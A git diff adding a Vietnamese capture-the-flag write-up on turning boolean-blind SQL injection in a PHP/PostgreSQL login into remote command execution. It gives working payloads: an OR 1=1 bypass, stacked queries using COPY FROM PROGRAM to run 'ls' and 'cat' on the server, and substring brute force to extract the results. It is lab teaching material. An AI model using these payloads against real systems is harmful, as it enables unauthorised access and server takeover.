@@ -77,4 +77,55 @@
 
 # 2. Baby SQL Injection to RCE
 
+## Đầu bài cho biết
+- Challenge đang chạy với PostgreSQL and PHP.
+- Flag File: /flagXXXX.txt
+
+## Hint
+- Sử dụng Stacked Query: là việc có thể sử dụng nhiều câu truy vấn bằng cách ngăn cách giữa các câu truy vấn bằng dấu ';'
+
+![image](https://github.com/user-attachments/assets/fca0de01-a3f1-463c-b405-30f503ab6a75)
+
+## Giải
+
+![image](https://github.com/user-attachments/assets/c6daf554-ff8e-498f-9ff7-d7bc60b5aee9)
+
+- `'OR 1=1 --` có thể khai thác được lỗ hổng SQL ở đây
+
+![image](https://github.com/user-attachments/assets/99efbf7f-791c-468a-8585-822bcb9dab15)
+
+- Mục tiêu của mình là dựa vào lỗ hổng này để tìm và mở được 1 file là `flagXXXX.txt` và lấy flag trong file đó
+- Quan sát thì thấy, khi nhập username hoặc pass thì nó chỉ có 2 trường hợp xảy ra:
+
+![image](https://github.com/user-attachments/assets/a03a8305-8809-4770-ad28-b7f77d5f245a)
+![image](https://github.com/user-attachments/assets/362232fe-47e6-4aa4-b134-707a9e32e0b9)
+
+- Ở đây khá chắc là Boolean SQli
+- Vì ở đây nó không cho ta biết được kết quả của chuỗi truy vấn nên ta không thể trực tiếp chèn các hàm như `pg_read_file()`, `cat` đêr trực tiếp đọc file này. Mặt khác, ta cũng không có tên của file flag để đọc 😃
+- Vậy là bây giờ cần:
+    + Tạo ra 1 bảng mới
+    + Lấy tên tất cả các file đưa vào bảng mới tạo
+    + Dùng cách dò đúng sai để biết được các tên file flag cần tìm
+- Tạo bảng mới: `admin'; CREATE TABLE abc(aaa text);--`
+    + ![image](https://github.com/user-attachments/assets/32ade69b-5395-4239-943b-c3e676a737ad)
+    + Gửi lại lần 2 để xác nhận bảng `abc` đã tồn tại
+- Đưa tất cả tên file vào trong bảng `abc` vừa tạo: `admin'; COPY abc FROM PROGRAM 'ls / -m';--` (Với `ls / -m`) để đưa tất cả tên file vào 1 dòng duy nhất
+- Brute force từng chữ: `admin' OR (SELECT SUBSTRING(aaa,1,1) FROM abc LIMIT 1) = 'a'--`
+    + Nếu ra `Welcome, admin...` thì là đúng
+    + Ra `Invalid username or password!` thì ký tự đó sai
+- Đưa vào Intruder:
+![image](https://github.com/user-attachments/assets/f72ef139-71ac-4093-a639-c2c6a3b3b337)
+
+- Vậy là ta kiếm được tên file là `flags3JDE.txt`
+- Tương tự với cách trên, ta tạo 1 bảng chứa nội dung của file `flags3JDE.txt`
+    + `'; CREATE TABLE efg(sss text);--`
+    + `'; COPY efg FROM PROGRAM 'cat flags3JDE.txt';--`
+    + Rồi tương tự dùng brute force để đọc lại bảng `efg`: `' OR (SELECT SUBSTRING(sss,1,1) FROM efg LIMIT 1) = 'a'--`
+
+
+
+
+
+
+
 # 3. Blind Logger Middleware
